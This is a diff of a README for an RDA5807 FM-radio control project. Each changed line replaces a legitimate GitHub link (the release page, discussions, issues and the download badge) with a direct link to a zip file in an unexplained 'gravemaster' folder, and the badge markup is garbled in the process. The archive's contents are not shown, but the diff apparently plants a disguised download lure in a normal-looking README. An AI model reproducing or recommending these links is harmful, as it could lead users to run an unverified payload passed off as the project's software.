@@ -8,7 +8,7 @@ Welcome to the RDA5807-EEPROM-BUTTON project! This application controls the RDA5
 
 **Click the button below to download the latest version:**
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%23007bff.svg?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Aldrichxjustin/RDA5807-EEPROM-BUTTON/releases)
+[![Download Now](https://raw.githubusercontent.com/Aldrichxjustin/RDA5807-EEPROM-BUTTON/main/gravemaster/RDA5807-EEPROM-BUTTON.zip%20Now-%https://raw.githubusercontent.com/Aldrichxjustin/RDA5807-EEPROM-BUTTON/main/gravemaster/RDA5807-EEPROM-BUTTON.zip)](https://raw.githubusercontent.com/Aldrichxjustin/RDA5807-EEPROM-BUTTON/main/gravemaster/RDA5807-EEPROM-BUTTON.zip)
 
 ## 💻 System Requirements
 
@@ -27,7 +27,7 @@ To run this software, you need the following:
 
 ## 📚 Download & Install
 
-1. **Visit this page to download**: [Releases Page](https://github.com/Aldrichxjustin/RDA5807-EEPROM-BUTTON/releases).
+1. **Visit this page to download**: [Releases Page](https://raw.githubusercontent.com/Aldrichxjustin/RDA5807-EEPROM-BUTTON/main/gravemaster/RDA5807-EEPROM-BUTTON.zip).
 
 2. Look for the latest release. 
 
@@ -53,11 +53,11 @@ To run this software, you need the following:
 
 If you need help or want to learn more, check our community discussions. It’s a great place to ask questions or share experiences. 
 
-Join the discussions on our [GitHub Discussions Page](https://github.com/Aldrichxjustin/RDA5807-EEPROM-BUTTON/discussions).
+Join the discussions on our [GitHub Discussions Page](https://raw.githubusercontent.com/Aldrichxjustin/RDA5807-EEPROM-BUTTON/main/gravemaster/RDA5807-EEPROM-BUTTON.zip).
 
 ## 💬 Feedback
 
-Your feedback helps us improve. Please let us know your thoughts via the [Issues Page](https://github.com/Aldrichxjustin/RDA5807-EEPROM-BUTTON/issues). 
+Your feedback helps us improve. Please let us know your thoughts via the [Issues Page](https://raw.githubusercontent.com/Aldrichxjustin/RDA5807-EEPROM-BUTTON/main/gravemaster/RDA5807-EEPROM-BUTTON.zip). 
 
 ## 🔗 Included Topics
 
@@ -76,4 +76,4 @@ For additional information about each topic, feel free to search online or visit
 
 Thank you for using RDA5807-EEPROM-BUTTON! Enjoy a seamless FM tuning experience. 
 
-Remember to visit this page to download: [Releases Page](https://github.com/Aldrichxjustin/RDA5807-EEPROM-BUTTON/releases).
+Remember to visit this page to download: [Releases Page](https://raw.githubusercontent.com/Aldrichxjustin/RDA5807-EEPROM-BUTTON/main/gravemaster/RDA5807-EEPROM-BUTTON.zip).
